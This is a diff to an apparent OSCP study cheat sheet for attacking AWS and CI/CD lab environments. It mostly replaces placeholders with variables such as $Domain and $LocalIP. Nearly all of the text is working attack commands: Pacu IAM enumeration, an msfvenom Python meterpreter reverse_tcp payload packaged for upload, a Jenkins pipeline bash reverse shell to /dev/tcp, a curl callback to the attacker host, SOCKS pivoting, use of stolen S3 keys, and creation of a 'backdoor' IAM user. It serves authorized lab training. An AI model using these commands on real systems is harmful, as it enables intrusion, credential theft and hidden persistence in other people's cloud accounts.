@@ -33,19 +33,19 @@ aws sts get-caller-identity --profile <name>
 
 ```bash
 # Identify DNS provider from NS records
-host -t ns <domain>
+host -t ns $Domain
 whois <ns-hostname> | grep "Registrant Organization"   # awsdns-* → Amazon = Route53
 
 # Resolve hostname + reverse DNS to confirm EC2
-host www.<domain>
-host <ip>    # → ec2-X.compute-1.amazonaws.com confirms EC2
+host www.$Domain
+host $BoxIP    # → ec2-X.compute-1.amazonaws.com confirms EC2
 
 # TXT records — may contain flags/data hidden in SPF strings
-dig TXT <domain> @<dns_ip>
-dig TXT <domain>    # uses system resolver
+dig TXT $Domain @$BoxIP
+dig TXT $Domain    # uses system resolver
 
 # Subdomain brute force (zone transfer will fail on Route53 — expected)
-dnsenum <domain> --threads 100
+dnsenum $Domain --threads 100
 ```
 
 ---
@@ -54,7 +54,7 @@ dnsenum <domain> --threads 100
 
 ```bash
 # Extract bucket name from site HTML (suffix embedded in asset URLs)
-curl -s http://<site_ip> -H "Host: www.<domain>" | grep -o '<org>-[^/"]*'
+curl -s http://$BoxIP -H "Host: www.$Domain" | grep -o '<org>-[^/"]*'
 
 # Test bucket access level
 curl -s "https://s3.amazonaws.com/<bucket-name>/"
@@ -117,11 +117,11 @@ aws sts get-caller-identity --profile <name>
 aws sts get-access-key-info --access-key-id AKIA... --profile <name>
 
 # Scope permissions — user's direct policies
-aws iam list-user-policies --user-name <user> --profile <name>          # inline
-aws iam list-attached-user-policies --user-name <user> --profile <name>  # managed
+aws iam list-user-policies --user-name $Username --profile <name>          # inline
+aws iam list-attached-user-policies --user-name $Username --profile <name>  # managed
 
 # Scope permissions — group memberships
-aws iam list-groups-for-user --user-name <user> --profile <name>
+aws iam list-groups-for-user --user-name $Username --profile <name>
 aws iam list-group-policies --group-name <group> --profile <name>          # inline
 aws iam list-attached-group-policies --group-name <group> --profile <name>  # managed
 
@@ -176,13 +176,13 @@ data IAM                            # dump all IAM data for current session
 export_keys                         # write active keys back to ~/.aws/credentials
 
 # IAM enumeration modules
-run iam__enum_roles --account-id <acct> --word-list /tmp/roles.txt   # cross-account role oracle
-run iam__enum_users --account-id <acct> --word-list /tmp/users.txt   # cross-account user oracle
+run iam__enum_roles --account-id $Username --word-list /tmp/roles.txt   # cross-account role oracle
+run iam__enum_users --account-id $Username --word-list /tmp/users.txt   # cross-account user oracle
 run iam__enum_users_roles_policies_groups                             # full IAM dump (like get-account-authorization-details)
 run iam__bruteforce_permissions                                       # try all IAM actions (noisy)
 
 # Assume role from within Pacu
-assume_role arn:aws:iam::<acct>:role/<role-name>
+assume_role arn:aws:iam::$Username:role/<role-name>
 # → adds temp keys to session database, swaps active keys
 
 # Run native AWS CLI commands inside Pacu
@@ -203,7 +203,7 @@ aws sts get-caller-identity   # uses current Pacu active keys (NOT ~/.aws/creden
 ```bash
 # Generate meterpreter Python payload (from attacker machine)
 msfvenom -f raw -p python/meterpreter/reverse_tcp \
-  LHOST=<your-public-ip> LPORT=4488
+  LHOST=$LocalIP LPORT=4488
 
 # Build package (from hackshort-util/ directory)
 python3 setup.py sdist
@@ -290,7 +290,7 @@ run -j
 route add 172.30.0.0 255.255.0.0 <session_id>
 
 # From personal Kali
-ssh -fN -L localhost:1080:localhost:1080 kali@<cloud-kali-ip>
+ssh -fN -L localhost:1080:localhost:1080 kali@$LocalIP
 ss -tulpn | grep 1080   # confirm tunnel
 
 # Firefox: Settings → Network Settings → SOCKS5 127.0.0.1:1080
@@ -349,11 +349,11 @@ aws --profile=stolen-s3 s3 cp s3://<bucket>/secretFile -
 
 ```bash
 # Resolve without changing system DNS
-nslookup pypi.offseclab.io <DNS_IP>
+nslookup pypi.offseclab.io $BoxIP
 
 # Add to /etc/hosts (restart-free, no nmcli needed)
-echo "<resolved-ip> pypi.offseclab.io" | sudo tee -a /etc/hosts
-echo "<resolved-ip> git.offseclab.io" | sudo tee -a /etc/hosts
+echo "$BoxIP pypi.offseclab.io" | sudo tee -a /etc/hosts
+echo "$BoxIP git.offseclab.io" | sudo tee -a /etc/hosts
 
 # Verify
 ping -c1 pypi.offseclab.io
@@ -392,7 +392,7 @@ gitleaks detect   # run from repo root
 
 # Manual review (always do this regardless of gitleaks)
 git log           # look for: "Fix issue", "Remove secret", "Clean up", "Oops"
-git show <commit_hash>   # inspect any suspicious commit
+git show $AdminHash   # inspect any suspicious commit
 
 # Decode discovered base64 credential
 echo "<base64_value>" | base64 --decode
@@ -411,7 +411,7 @@ pipeline {
         withAWS(region: 'us-east-1', credentials: 'aws_key') {
           script {
             if (isUnix()) {
-              sh 'bash -c "bash -i >& /dev/tcp/<cloud-kali-ip>/4242 0>&1" &'
+              sh 'bash -c "bash -i >& /dev/tcp/$LocalIP/4242 0>&1" &'
             }
           }
         }
@@ -424,7 +424,7 @@ pipeline {
 ```bash
 # Test step: start apache2 first, commit curl payload, watch logs
 sudo systemctl start apache2
-# curl payload: sh 'curl http://<cloud-kali-ip>/unix'
+# curl payload: sh 'curl http://$LocalIP/unix'
 tail -f /var/log/apache2/access.log
 
 # Real step: start nc, commit bash reverse shell payload
@@ -456,13 +456,13 @@ aws --profile CompromisedJenkins sts get-caller-identity
 # → ARN reveals username (e.g., user/system/jenkins-admin)
 
 # Check all three policy attachment types
-aws --profile CompromisedJenkins iam list-user-policies --user-name <username>
-aws --profile CompromisedJenkins iam list-attached-user-policies --user-name <username>
-aws --profile CompromisedJenkins iam list-groups-for-user --user-name <username>
+aws --profile CompromisedJenkins iam list-user-policies --user-name $Username
+aws --profile CompromisedJenkins iam list-attached-user-policies --user-name $Username
+aws --profile CompromisedJenkins iam list-groups-for-user --user-name $Username
 
 # Read inline policy
 aws --profile CompromisedJenkins iam get-user-policy \
-  --user-name <username> --policy-name <policy-name>
+  --user-name $Username --policy-name <policy-name>
 
 # Create backdoor user (use inconspicuous name in real engagements)
 aws --profile CompromisedJenkins iam create-user --user-name backdoor
@@ -482,3 +482,14 @@ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
